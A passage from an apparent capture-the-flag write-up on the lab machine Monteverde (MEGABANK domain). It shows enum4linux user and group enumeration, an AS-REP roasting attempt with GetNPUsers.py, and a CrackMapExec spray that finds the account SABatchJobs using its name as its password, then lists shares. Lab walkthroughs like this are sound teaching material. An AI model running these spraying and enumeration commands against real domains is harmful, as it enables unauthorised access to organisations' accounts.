</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Getting</span> <span class=n>builtin</span> <span class=n>groups</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Pre</span><span class=o>-</span><span class=n>Windows</span> <span class=mi>2000</span> <span class=n>Compatible</span> <span class=n>Access</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x22a</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Incoming</span> <span class=n>Forest</span> <span class=n>Trust</span> <span class=n>Builders</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x22d</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Windows</span> <span class=n>Authorization</span> <span class=n>Access</span> <span class=n>Group</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x230</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Terminal</span> <span class=n>Server</span> <span class=n>License</span> <span class=n>Servers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x231</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x221</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Guests</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x222</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Remote</span> <span class=n>Desktop</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x22b</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Network</span> <span class=n>Configuration</span> <span class=n>Operators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x22c</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=ne>Performance</span> <span class=n>Monitor</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x22e</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=ne>Performance</span> <span class=n>Log</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x22f</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Distributed</span> <span class=n>COM</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x232</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>IIS_IUSRS</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x238</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Cryptographic</span> <span class=n>Operators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x239</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Event</span> <span class=n>Log</span> <span class=n>Readers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x23d</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Certificate</span> <span class=n>Service</span> <span class=n>DCOM</span> <span class=n>Access</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x23e</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>RDS</span> <span class=n>Remote</span> <span class=n>Access</span> <span class=n>Servers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x23f</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>RDS</span> <span class=n>Endpoint</span> <span class=n>Servers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x240</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>RDS</span> <span class=n>Management</span> <span class=n>Servers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x241</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Hyper</span><span class=o>-</span><span class=n>V</span> <span class=n>Administrators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x242</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Access</span> <span class=ne>Control</span> <span class=n>Assistance</span> <span class=n>Operators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x243</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Remote</span> <span class=n>Management</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x244</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Storage</span> <span class=n>Replica</span> <span class=n>Administrators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x246</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Getting</span> <span class=n>builtin</span> <span class=n>group</span> <span class=n>memberships</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;IIS_IUSRS&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>568</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>Couldn</span><span class=s1>&#39;t lookup SIDs</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Remote Management Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>580</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>Couldn</span><span class=s1>&#39;t lookup SIDs</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Pre-Windows 2000 Compatible Access&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>554</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>Couldn</span><span class=s1>&#39;t lookup SIDs</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Windows Authorization Access Group&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>560</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>Couldn</span><span class=s1>&#39;t lookup SIDs</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>545</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>Couldn</span><span class=s1>&#39;t lookup SIDs</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Guests&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>546</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>Couldn</span><span class=s1>&#39;t lookup SIDs</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Getting</span> <span class=n>local</span> <span class=n>groups</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Cert</span> <span class=n>Publishers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x205</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>RAS</span> <span class=ow>and</span> <span class=n>IAS</span> <span class=n>Servers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x229</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Allowed</span> <span class=n>RODC</span> <span class=n>Password</span> <span class=n>Replication</span> <span class=n>Group</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x23b</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Denied</span> <span class=n>RODC</span> <span class=n>Password</span> <span class=n>Replication</span> <span class=n>Group</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x23c</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>DnsAdmins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x44d</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>SQLServer2005SQLBrowserUser</span><span class=o>$</span><span class=n>MONTEVERDE</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x44f</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>ADSyncAdmins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x451</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>ADSyncOperators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x452</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>ADSyncBrowse</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x453</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>ADSyncPasswordSet</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x454</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Getting</span> <span class=n>local</span> <span class=n>group</span> <span class=n>memberships</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Denied RODC Password Replication Group&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>572</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>Couldn</span><span class=s1>&#39;t lookup SIDs</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;ADSyncAdmins&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>1105</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>Couldn</span><span class=s1>&#39;t lookup SIDs</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Getting</span> <span class=n>domain</span> <span class=n>groups</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Enterprise</span> <span class=n>Read</span><span class=o>-</span><span class=n>only</span> <span class=n>Domain</span> <span class=n>Controllers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x1f2</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Domain</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x201</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Domain</span> <span class=n>Guests</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x202</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Domain</span> <span class=n>Computers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x203</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Group</span> <span class=n>Policy</span> <span class=n>Creator</span> <span class=n>Owners</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x208</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Cloneable</span> <span class=n>Domain</span> <span class=n>Controllers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x20a</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Protected</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x20d</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>DnsUpdateProxy</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x44e</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Azure</span> <span class=n>Admins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa29</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=ne>File</span> <span class=n>Server</span> <span class=n>Admins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa2e</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Call</span> <span class=n>Recording</span> <span class=n>Admins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa2f</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Reception</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa30</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Operations</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa31</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Trading</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa32</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>HelpDesk</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa33</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Developers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa34</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Getting</span> <span class=n>domain</span> <span class=n>group</span> <span class=n>memberships</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Operations&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>2609</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>smorgan</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Group Policy Creator Owners&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>520</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>Administrator</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Domain Guests&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>514</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>Guest</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>Administrator</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>krbtgt</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>AAD_987d7f2f57d2</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>mhope</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>SABatchJobs</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>svc</span><span class=o>-</span><span class=n>ata</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>svc</span><span class=o>-</span><span class=n>bexec</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>svc</span><span class=o>-</span><span class=n>netapp</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>dgalanos</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>roleary</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>smorgan</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Trading&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>2610</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>dgalanos</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Azure Admins&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>2601</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>Administrator</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Azure Admins&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>2601</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>AAD_987d7f2f57d2</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;Azure Admins&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>2601</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>mhope</span>
</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=s1>&#39;HelpDesk&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>2611</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>MEGABANK</span>\<span class=n>roleary</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>=======================================================================</span>
</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>Users</span> <span class=n>on</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span> <span class=n>via</span> <span class=ne>RID</span> <span class=n>cycling</span> <span class=p>(</span><span class=n>RIDS</span><span class=p>:</span> <span class=mi>500</span><span class=o>-</span><span class=mi>550</span><span class=p>,</span><span class=mi>1000</span><span class=o>-</span><span class=mi>1050</span><span class=p>)</span>    <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>=======================================================================</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>E</span><span class=p>]</span> <span class=n>Couldn</span><span class=s1>&#39;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>=============================================</span>
</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>Getting</span> <span class=n>printer</span> <span class=n>info</span> <span class=k>for</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>=============================================</span>
</span></span><span class=line><span class=cl><span class=n>Unable</span> <span class=n>to</span> <span class=n>initialize</span> <span class=n>messaging</span> <span class=n>context</span>
</span></span><span class=line><span class=cl><span class=n>Could</span> <span class=ow>not</span> <span class=n>initialise</span> <span class=n>spoolss</span><span class=o>.</span> <span class=n>Error</span> <span class=n>was</span> <span class=n>NT_STATUS_ACCESS_DENIED</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>enum4linux</span> <span class=n>complete</span> <span class=n>on</span> <span class=n>Wed</span> <span class=n>Mar</span> <span class=mi>25</span> <span class=mi>22</span><span class=p>:</span><span class=mi>31</span><span class=p>:</span><span class=mi>39</span> <span class=mi>2020</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>GetNPUsers</span><span class=o>.</span><span class=n>py</span> <span class=o>-</span><span class=n>no</span><span class=o>-</span><span class=k>pass</span> <span class=o>-</span><span class=n>dc</span><span class=o>-</span><span class=n>ip</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span> <span class=n>MEGABANK</span><span class=o>/</span><span class=n>smorgan</span>
</span></span><span class=line><span class=cl><span class=o>-&gt;</span> <span class=n>nothing</span>
</span></span></code></pre></td></tr></table></div></div><p>Thanks to <a href=https://github.com/CiscoCXSecurity/enum4linux>enum4linux</a>, we now have all users and groups information we need.</p><p>Let&rsquo;s try a quick bruteforce where user = password with <a href=https://github.com/byt3bl33d3r/CrackMapExec>CrackMapExec</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cme smb 10.10.10.172 -u users.txt -p users.txt
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs
</span></span></code></pre></td></tr></table></div></div><h3 id=network-reconnaissance>Network reconnaissance<a hidden class=anchor aria-hidden=true href=#network-reconnaissance>#</a></h3><p>We found the password <code>SABatchJobs</code> use the username as password.
Let&rsquo;s use this account for enumerating some shares:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>cme</span> <span class=n>smb</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span> <span class=o>-</span><span class=n>u</span> <span class=n>SABatchJobs</span> <span class=o>-</span><span class=n>p</span> <span class=n>SABatchJobs</span> <span class=o>--</span><span class=n>shares</span>
</span></span><span class=line><span class=cl><span class=n>SMB</span>         <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=mi>445</span>    <span class=n>MONTEVERDE</span>       <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Windows</span> <span class=mf>10.0</span> <span class=n>Build</span> <span class=mi>17763</span> <span class=n>x64</span> <span class=p>(</span><span class=n>name</span><span class=p>:</span><span class=n>MONTEVERDE</span><span class=p>)</span> <span class=p>(</span><span class=n>domain</span><span class=p>:</span><span class=n>MEGABANK</span><span class=p>)</span> <span class=p>(</span><span class=n>signing</span><span class=p>:</span><span class=n>True</span><span class=p>)</span> <span class=p>(</span><span class=n>SMBv1</span><span class=p>:</span><span class=n>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>SMB</span>         <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=mi>445</span>    <span class=n>MONTEVERDE</span>       <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>MEGABANK</span>\<span class=n>SABatchJobs</span><span class=p>:</span><span class=n>SABatchJobs</span>
</span></span><span class=line><span class=cl><span class=n>SMB</span>         <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=mi>445</span>    <span class=n>MONTEVERDE</span>       <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Enumerated</span> <span class=n>shares</span>
</span></span><span class=line><span class=cl><span class=n>SMB</span>         <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=mi>445</span>    <span class=n>MONTEVERDE</span>       <span class=n>Share</span>           <span class=n>Permissions</span>     <span class=n>Remark</span>
</span></span><span class=line><span class=cl><span class=n>SMB</span>         <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=mi>445</span>    <span class=n>MONTEVERDE</span>       <span class=o>-----</span>           <span class=o>-----------</span>     <span class=o>------</span>
</span></span><span class=line><span class=cl><span class=n>SMB</span>         <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=mi>445</span>    <span class=n>MONTEVERDE</span>       <span class=n>ADMIN</span><span class=o>$</span>                          <span class=n>Remote</span> <span class=n>Admin</span>
</span></span><span class=line><span class=cl><span class=n>SMB</span>         <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=mi>445</span>    <span class=n>MONTEVERDE</span>       <span class=n>azure_uploads</span>   <span class=n>READ</span>
</span></span><span class=line><span class=cl><span class=n>SMB</span>         <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=mi>445</span>    <span class=n>MONTEVERDE</span>       <span class=n>C</span><span class=o>$</span>                              <span class=n>Default</span> <span class=n>share</span>
</span></span><span class=line><span class=cl><span class=n>SMB</span>         <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=mi>445</span>    <span class=n>MONTEVERDE</span>       <span class=n>E</span><span class=o>$</span>                              <span class=n>Default</span> <span class=n>share</span>
</span></span><span class=line><span class=cl><span class=n>SMB</span>         <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=mi>445</span>    <span class=n>MONTEVERDE</span>       <span class=n>IPC</span><span class=o>$</span>            <span class=n>READ</span>            <span class=n>Remote</span> <span class=n>IPC</span>
</span></span><span class=line><span class=cl><span class=n>SMB</span>         <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=mi>445</span>    <span class=n>MONTEVERDE</span>       <span class=n>NETLOGON</span>        <span class=n>READ</span>            <span class=n>Logon</span> <span class=n>server</span> <span class=n>share</span>
</span></span><span class=line><span class=cl><span class=n>SMB</span>         <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=mi>445</span>    <span class=n>MONTEVERDE</span>       <span class=n>SYSVOL</span>          <span class=n>READ</span>            <span class=n>Logon</span> <span class=n>server</span> <span class=n>share</span>
